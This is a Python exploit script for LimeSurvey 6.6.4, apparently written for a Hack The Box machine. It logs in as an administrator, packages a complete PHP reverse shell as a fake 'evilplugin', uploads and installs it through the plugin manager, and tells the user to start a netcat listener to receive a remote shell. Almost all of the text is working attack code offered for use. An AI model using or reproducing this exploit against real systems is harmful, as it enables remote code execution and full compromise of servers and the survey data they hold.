import requests
import argparse
import os
from zipfile import ZipFile
from requests.auth import HTTPBasicAuth
from urllib.parse import unquote
from requests.exceptions import RequestException, ConnectionError


def zip_files(file1, file2):
    files_to_zip = [file1, file2]
    with ZipFile('evilplugin.zip', 'w') as zip:
        for file in files_to_zip:
            zip.write(file)    
    return 'evilplugin.zip'

def create_files(ip, port):
    config_xml = '''<?xml version="1.0" encoding="UTF-8"?>
    <config>
    <metadata>
        <name>evilplugin</name>
        <type>plugin</type>
        <version>1.0.0</version>
        <author>chatGPT</author>
        <authorUrl>http://example.com</authorUrl>
        <supportUrl>http://example.com</supportUrl>
        <creationDate>2024-01-01</creationDate>
        <license>GNU General Public License version 3 or later</license>
        <description>
    <![CDATA[Author : ...]]></description>
    </metadata>

    <compatibility>
        <version>6.0</version>
        <version>5.0</version>
        <version>4.0</version>
        <version>3.0</version>
    </compatibility>
    </config>
    '''
    reverse_shell_php = '''
        <?php

    set_time_limit (0);
    $VERSION = "1.0";
    $ip = ''' + "'" + ip + "'"''';  // CHANGE THIS
    $port = ''' + port + ''';       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;


    if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        
        if ($pid == -1) {
            printit("ERROR: Can't fork");
            exit(1);
        }
        
        if ($pid) {
            exit(0);  // Parent exits
        }

        if (posix_setsid() == -1) {
            printit("Error: Can't setsid()");
            exit(1);
        }

        $daemon = 1;
    } else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }


    chdir("/");

    umask(0);

    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
    }

    $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
    }

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    printit("Successfully opened reverse shell to $ip:$port");

    while (1) {
        if (feof($sock)) {
            printit("ERROR: Shell connection terminated");
            break;
        }
        if (feof($pipes[1])) {
            printit("ERROR: Shell process terminated");
            break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
            if ($debug) printit("SOCK READ");
            $input = fread($sock, $chunk_size);
            if ($debug) printit("SOCK: $input");
            fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
            if ($debug) printit("STDOUT READ");
            $input = fread($pipes[1], $chunk_size);
            if ($debug) printit("STDOUT: $input");
            fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
            if ($debug) printit("STDERR READ");
            $input = fread($pipes[2], $chunk_size);
            if ($debug) printit("STDERR: $input");
            fwrite($sock, $input);
        }
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
    function printit ($string) {
        if (!$daemon) {
            print "$string\n";
        }
    }

    ?>'''

    with open("evilplugin.php", "w") as file:
        file.write(reverse_shell_php)

    with open("config.xml", "w") as file:
        file.write(config_xml)

    return 'evilplugin.php','config.xml'

def get_admin_cookie(login_page_url, username, password):
    client = requests.session()
    
    raw_csrf_token = client.get(login_page_url).cookies['YII_CSRF_TOKEN'] 
    csrf_token = unquote(raw_csrf_token)
    ##Change headers and data to match website's your're trying to exploit
    headers = {
        'User-Agent' : 'stillwaiting',
        'Referer' : login_page_url,
        'Origin' : 'http://take-survey.heal.htb',
        'Content-Type' : 'application/x-www-form-urlencoded'
    }

    data = {
        'YII_CSRF_TOKEN' : csrf_token,
        'authMethod' : 'Authdb',
        'user' : username,
        'password' : password,
        'loginlang' : 'default',
        'action' : 'login',
        'width' : '1000',
        'login_submit' : 'login'
    }
    print("[+] Requesting admin cookie")
    request = client.post(login_page_url, data=data, headers=headers)
    session_cookies = client.cookies.get_dict()
    client.close()
    return session_cookies['LS-ZNIDJBOXUNKXWTIP']

def upload_plugin(plugin, url, admin_cookie):
    
    cookies = {
        "LS-ZNIDJBOXUNKXWTIP" : admin_cookie,
        "YII_CSRF_TOKEN" : "YWhnZGwySURtOWdqYTJRb254ZmVIaXVGQUtGbTZNZWmaFG5JQa2mRcR7nCD9Sto_gFyseMkLvCW1Etdyg74qTA=="
    }
    
    data = {
        "YII_CSRF_TOKEN" : "YWhnZGwySURtOWdqYTJRb254ZmVIaXVGQUtGbTZNZWmaFG5JQa2mRcR7nCD9Sto_gFyseMkLvCW1Etdyg74qTA==",
        "lid" : "$lid",
        "action" : "templateupload"
    }

    files = {
        "the_file" : (plugin, open(plugin, "rb"), "application/zip")
    }

    headers = {
        "User-Agent" : "Anonymous",
        "Referer" : url + "/index.php/admin/pluginmanager?sa=index",
        "Origin" : url
    }

    response = requests.post(url + "/admin/pluginmanager?sa=upload", data=data, files=files, cookies=cookies, headers=headers)
    print(f"[+] Sending payload to {url}/admin/pluginmanager?sa=upload")
    
    confirmation_data = {
        "YII_CSRF_TOKEN" : 'YWhnZGwySURtOWdqYTJRb254ZmVIaXVGQUtGbTZNZWmaFG5JQa2mRcR7nCD9Sto_gFyseMkLvCW1Etdyg74qTA==',
        "isUpdate" : 'false'
    }
    
    confirm_upload_response = requests.post(url + "/admin/pluginmanager?sa=installUploadedPlugin", data=confirmation_data, cookies=cookies, headers=headers)
    if confirm_upload_response.status_code == 200:
        print("[+] Payload sent")
    else:
        print("[-] Could not send the payload.")

def test_if_admin(url, cookie):
    cookies = {"LS-ZNIDJBOXUNKXWTIP" : cookie}
    req = requests.get(url, cookies=cookies)
    if "forgotpassword" in req.text:
        print("[-] Invalid credentials.")
        exit(2)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for LimeSurvey 6.6.4 - Uploads a malicious plugin to gain a reverse shell.")

    parser.add_argument("--target", help="URL of LimeSurvey instance (eg. http://online-surveys.com)")
    parser.add_argument("--ip", required=True, help="IP address for reverse shell callback")
    parser.add_argument("--port", required=True, help="Port for reverse shell callback")
    parser.add_argument("--username", required=True, help="Admin dashboard username")
    parser.add_argument("--password", required=True, help="Admin dashboard password")

    args = parser.parse_args()

    port = args.port
    ip = args.ip
    password = args.password
    username = args.username
    url = args.target
    login_page_url = url + '/index.php/admin/authentication/sa/login'
    admin_page_url = url + '/index.php/admin/index'
    cookie = get_admin_cookie(login_page_url, username, password) 
    test_if_admin(admin_page_url, cookie)
    filenames = create_files(ip, port)
    plugin_name = zip_files(filenames[0], filenames[1])
    upload_plugin(plugin_name, url, cookie)
    print("[INFO] Open up your netcat listener and activate your plugin.")
    print("If you don't recieve connection, find your plugin manually at http://website/plugins/evilplugin/evilplugin.php")
